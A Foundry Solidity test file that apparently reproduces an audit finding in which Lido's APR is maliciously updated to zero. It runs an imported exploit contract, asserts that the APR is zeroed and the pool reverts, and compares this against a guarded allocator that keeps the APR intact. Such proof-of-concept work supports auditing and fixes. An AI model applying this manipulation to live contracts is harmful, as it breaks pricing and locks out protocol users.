// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Terms,
    Lido,
    LidoAllocator,
    Pool
} from "./35262-h-01-lidos-apr-can-be-maliciously-updated-to-0-value-due-to.sol";

/// Same formula, but updateLidoValues refuses to sample inside getLidoUpdateTolerance.
contract GuardedAllocator {
    uint256 private constant _BPS = 10000;
    uint256 private constant _SECONDS_PER_YEAR = 365 days;

    struct LidoData {
        uint96 lastTs;
        uint144 shareRate;
        uint16 aprBps;
    }

    Lido public lido;
    uint96 public immutable getLidoUpdateTolerance;
    LidoData public getLidoData;
    error InvalidAprError();

    constructor(Lido _lido, uint96 tolerance) {
        lido = _lido;
        getLidoUpdateTolerance = tolerance;
    }

    function seed(uint96 lastTs, uint16 aprBps) external {
        uint256 shareRate = lido.getTotalPooledEther() * 1e27 / lido.getTotalShares();
        getLidoData = LidoData(lastTs, uint144(shareRate), aprBps);
    }

    function getBaseAprWithUpdate() external returns (uint256) {
        LidoData memory lidoData = getLidoData;
        if (block.timestamp - lidoData.lastTs > getLidoUpdateTolerance) {
            _updateLidoValues(lidoData);
        }
        if (lidoData.aprBps == 0) revert InvalidAprError();
        return lidoData.aprBps;
    }

    function updateLidoValues() external {
        LidoData memory data = getLidoData;
        if (block.timestamp - data.lastTs > getLidoUpdateTolerance) {
            _updateLidoValues(data);
        }
    }

    function _updateLidoValues(LidoData memory _lidoData) private {
        uint256 shareRate = lido.getTotalPooledEther() * 1e27 / lido.getTotalShares();
        _lidoData.aprBps = uint16(
            (_BPS * _SECONDS_PER_YEAR * (shareRate - _lidoData.shareRate)) / _lidoData.shareRate
                / (block.timestamp - _lidoData.lastTs)
        );
        _lidoData.shareRate = uint144(shareRate);
        _lidoData.lastTs = uint96(block.timestamp);
        getLidoData = _lidoData;
    }
}

contract GuardedPool {
    GuardedAllocator public allocator;
    uint256 public quotedApr;

    constructor(GuardedAllocator _allocator) {
        allocator = _allocator;
    }

    function validateOffer() external returns (uint256 apr) {
        apr = allocator.getBaseAprWithUpdate();
        quotedApr = apr;
    }
}

contract Finding35262Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;
    // Native-profit playground deploys the first CREATE at attacker nonce 0.
    address constant EXPLOIT = 0x8F7a45eBDe059392E46A46DCc14AB24681A961Ea;
    address constant LIDO = 0x97B0aBF484ECbcc9c901f4CfD91C5842d7DDb623;
    address constant ALLOCATOR = 0x5F3Afa681bcca1Ad2F1bE81e10B9e1Cb754DC3C4;
    address constant POOL = 0x38F38379fBde8656B3A5871dE3596013eBEA73b2;

    function _lastTs() internal view returns (uint96) {
        uint256 nowTs = block.timestamp;
        uint256 last = nowTs > Terms.WINDOW ? nowTs - Terms.WINDOW : 0;
        return uint96(last);
    }

    function test_exploit_sets_apr_to_zero_and_pool_reverts() public {
        vm.prank(ATTACKER);
        Exploit e = new Exploit();
        assertEq(address(e), EXPLOIT, "exploit");
        assertEq(address(e.lido()), LIDO, "lido");
        assertEq(address(e.allocator()), ALLOCATOR, "allocator");
        assertEq(address(e.pool()), POOL, "pool");
        e.run();

        emit log_named_uint("quote before", e.quoteBefore());
        emit log_named_uint("apr after", e.aprAfter());
        emit log_named_uint("pool reverted", e.poolReverted());
        emit log_address(address(e));
        emit log_address(address(e.lido()));
        emit log_address(address(e.allocator()));
        emit log_address(address(e.pool()));

        assertEq(e.quoteBefore(), Terms.APR_BEFORE, "quote");
        assertEq(e.aprAfter(), Terms.APR_AFTER, "apr");
        assertEq(e.poolReverted(), 1, "revert");
        (, , uint16 apr) = e.allocator().getLidoData();
        assertEq(apr, 0, "stored");
    }

    function test_control_tolerance_keeps_apr() public {
        Lido lido = new Lido();
        GuardedAllocator allocator = new GuardedAllocator(lido, Terms.TOLERANCE);
        GuardedPool pool = new GuardedPool(allocator);
        allocator.seed(_lastTs(), Terms.APR_BEFORE);

        uint256 quote = allocator.getBaseAprWithUpdate();
        allocator.updateLidoValues();
        (, , uint16 apr) = allocator.getLidoData();
        uint256 afterQuote = pool.validateOffer();

        assertEq(quote, Terms.APR_BEFORE, "quote");
        assertEq(apr, Terms.APR_BEFORE, "apr stayed");
        assertEq(afterQuote, Terms.APR_BEFORE, "pool quote");
        assertEq(pool.quotedApr(), Terms.APR_BEFORE, "recorded");
        assertEq(apr - Terms.APR_BEFORE, 0, "extra change");
    }
}
